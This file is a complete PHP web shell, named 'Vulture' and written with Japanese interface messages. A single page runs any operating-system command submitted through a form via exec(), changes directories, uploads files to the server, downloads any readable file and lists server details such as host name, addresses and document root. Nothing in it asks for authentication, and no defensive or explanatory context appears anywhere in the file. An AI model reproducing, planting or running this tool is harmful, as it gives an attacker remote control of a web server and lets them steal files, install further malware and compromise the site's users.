<?php

function toUTF8($output) {
    foreach ($output as $i => $line) {
        $output[$i] = iconv('Shift-JIS', 'UTF-8', $line);
    }
    return $output;
}

session_start();

if (!isset($_SESSION['currentDir'])) {
    $_SESSION['currentDir'] = getcwd();
}
$currentDir = $_SESSION['currentDir'];
$files = scandir($currentDir);

$output = '';
$return_var = null;
$uploadSuccess = '';
$currentDir = getcwd();
$message = '';

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    if (isset($_POST['command'])) {
        $command = $_POST['command'];
        if ($command === "") {
            $message = "コマンドが入力されていません。";
        } elseif (strpos($command, 'cd ') === 0) {
            $newDir = substr($command, 3);
            $fullPath = $_SESSION['currentDir'] . '/' . $newDir;
            if (is_dir($fullPath) && chdir($fullPath)) {
                $_SESSION['currentDir'] = getcwd();
            } else {
                $output = array("ディレクトリの変更に失敗しました。");
            }
        } else if (chdir($_SESSION['currentDir'])) {
            exec($command, $output, $return_var);
            $output = toUTF8($output);
        } else {
            $output = array("指定されたディレクトリに移動できませんでした。");
        }
    } elseif (isset($_FILES['uploadedFile'])) {
        $file = $_FILES['uploadedFile'];
        if ($file['error'] === UPLOAD_ERR_OK) {
            $uploadFilePath = $_SESSION['currentDir'] . '/' . basename($file['name']);

            if (move_uploaded_file($file['tmp_name'], $uploadFilePath)) {
                $message =  'ファイルがアップロードされました: ' . htmlspecialchars(basename($file['name']));
            } else {
                $message = 'ファイルのアップロードに失敗しました。';
            }
        } else {
            $message =  'ファイルのアップロードに失敗しました。エラーコード: ' . $file['error'];
        }
    }elseif (isset($_POST['resetDir'])) {
        $_SESSION['currentDir'] = getcwd();
    }elseif (isset($_POST['downloadFilename'])) {
        $filename = $_POST['downloadFilename'];
        $filePath = $_SESSION['currentDir'] . '/' . $filename;

        if (file_exists($filePath) && is_readable($filePath) && !is_dir($filePath)) {
            header('Content-Description: File Transfer');
            header('Content-Type: application/octet-stream');
            header('Content-Disposition: attachment; filename="'.basename($filePath).'"');
            header('Expires: 0');
            header('Cache-Control: must-revalidate');
            header('Pragma: public');
            header('Content-Length: ' . filesize($filePath));
            readfile($filePath);
            exit;
        }

        $message =  'ファイルが存在しないか、アクセスできません。';
    }
}

?>

<!DOCTYPE html>
<html lang='ja'>
<head>
<meta charset='UTF-8'>
<title>Vult 1</title>
<style>pre { width: 85%; height: 300px; overflow: auto; margin: 0 auto; }</style>
</head>
<body>
<h1>Vulture</h1>

<table class='status-table'>
    <tr>
        <td><b>Remote Host:</b></td>
        <td><?= $_SERVER['REMOTE_HOST'] ?? "N/A" ?> (<?= $_SERVER['REMOTE_ADDR'] ?? "N/A" ?>)</td>
    </tr>
    <tr>
        <td><b>Server Signature:</b></td>
        <td><?= $_SERVER['SERVER_SIGNATURE'] ?? "N/A" ?></td>
    </tr>
    <tr>
        <td><b>Server Address:</b></td>
        <td><?= $_SERVER['SERVER_ADDR'] ?? "N/A" ?></td>
    </tr>
    <tr>
        <td><b>Server Port:</b></td>
        <td><?= $_SERVER['SERVER_PORT'] ?? "N/A" ?></td>
    </tr>
    <tr>
        <td><b>Server Software:</b></td>
        <td><?= $_SERVER['SERVER_SOFTWARE'] ?? "N/A" ?></td>
    </tr>
    <tr>
        <td><b>Server Protocol:</b></td>
        <td><?= $_SERVER['SERVER_PROTOCOL'] ?? "N/A" ?></td>
    </tr>
    <tr>
        <td><b>Document Root:</b></td>
        <td><?= $_SERVER['DOCUMENT_ROOT'] ?? "N/A" ?></td>
    </tr>
    <tr>
        <td><b>OS Name:</b></td>
        <td><?= PHP_OS ?></td>
    </tr>
    <tr>
        <td><b>PC Name:</b></td>
        <td><?= gethostname() ?></td>
    </tr>
</table>


<b class='current-dir'>Current Directory</b>

<div class='current-dir-container'>
    <form method='post' class='reset'>
    <input type='hidden' name='resetDir' value='1'>
    <input type='submit' value='Reset'>
    </form>
    <p>Current Directory: <?= htmlspecialchars($_SESSION['currentDir']) ?></p>
</div>

<div class='forms'>
<form method='post' class='execute'>
<label><input type='text' name='command' size='50'></label>
<input type='submit' value='execute'>
</form>

<form method='post' class='download'>
    <label>
        <input type='text' name='downloadFilename' size='50' required>
    </label>
    <input type='submit' value='download'>
</form>

<form method='post' enctype='multipart/form-data' class='upload'>
<input type='file' name='uploadedFile'>
<input type='submit' value='upload'>
</form>

</div>

<hr>
<div class='result'>
<?php
echo "<h2>Execution Result：</h2>";
if ($return_var === 0) {
    echo '<pre class="output">';
    if (is_array($output)) {
        foreach ($output as $line) {
            echo htmlspecialchars($line) . PHP_EOL;
        }
    } else {
        echo htmlspecialchars($output);
    }
    echo '</pre>';
} else {
    echo "<p>コマンドの実行に失敗しました。</p>";
}

if ($uploadSuccess) {
    echo "<p>$uploadSuccess</p>";
}

if($message){
    echo htmlspecialchars($message);
}

?>

</div>
</body>
</html>
